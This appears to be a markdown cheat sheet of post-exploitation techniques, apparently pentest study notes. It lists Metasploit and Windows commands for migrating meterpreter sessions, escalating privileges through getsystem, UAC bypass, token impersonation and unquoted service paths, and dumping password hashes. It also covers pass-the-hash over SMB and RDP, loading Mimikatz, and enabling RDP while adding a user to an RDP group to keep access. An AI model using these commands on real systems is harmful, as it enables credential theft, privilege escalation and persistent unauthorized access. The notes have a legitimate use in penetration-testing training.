# Stable (Stabilize session)
## MSF Migrate
* `migrate` to a process that has higher chances of not being killed (e.g. from browser processes to system processes)
* `run <double_tabs>` - select meterpreter scripts

# Privileged (PrivEsc sessions)
## Windows Privilege Escalation
#### Metasploit
* `meterpreter> getsystem` - doesn't work when UAC is enabled and user is not admin
* `meterpreter> post/windows/gather/win_privs` - check UAC enabled
* `msf> search bypassuac` - `use` module, `set` configs and `exploit`
  * `meterpreter> getsystem` - will work if user on the new session is admin (with UAC enabled also)
* `meterpreter> use incognito` - use commands from this module (e.g. _list_tokens_)

#### General
* unquoted service paths
  * `wmic service get name,displayname,pathname,startmode | findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """` - find unquoted services
  * `msf> use exploit/windows/local/trusted_service_path` - module for exploiting unquoted path vulnerable instances

## Linux Privilege Escalation
* SUDO - https://gtfobins.github.io/
* SUID - https://gtfobins.github.io/#+suid
* Replace executable
* crontab
* root squashing

# Persistent (maintaining access)
## Hashes
* `meterpreter> run hashdump` - if it crashes (elevate privileges or migrate to another process)
* pass-the-hash -> `use exploit/windows/smb/psexec` - works with administrator account (possible issues with users in Admin group, but not Administrator)
* pass-the-hash over RDP -> `xfreerdp /u:<user> /d:<domain> /pth:<token> /v:<target>`

#### Mimikatz
* `sysinfo` - check on which processes meterpreter runs. It needs to be x64 for Mimikatz
* `ps -A x86_64 -s` list SYSTEM processes on x64 architecture
* `migrate <PID>` - migrate to a x64 processes
* `load mimikatz`

## Enable RDP service
* `net start` - check enabled services
* `wmic service where 'Caption like "Remote%" and started=true' get Caption` - check enabled remote services
* `meterpreter> <service_manager/enum_services>`
* `meterpreter> run getui -e` - enable RDP
* `net localgroup "<RDP-Group-With-Allow-Perm>" <user> /add` - add user to the group allowed to RDP connections
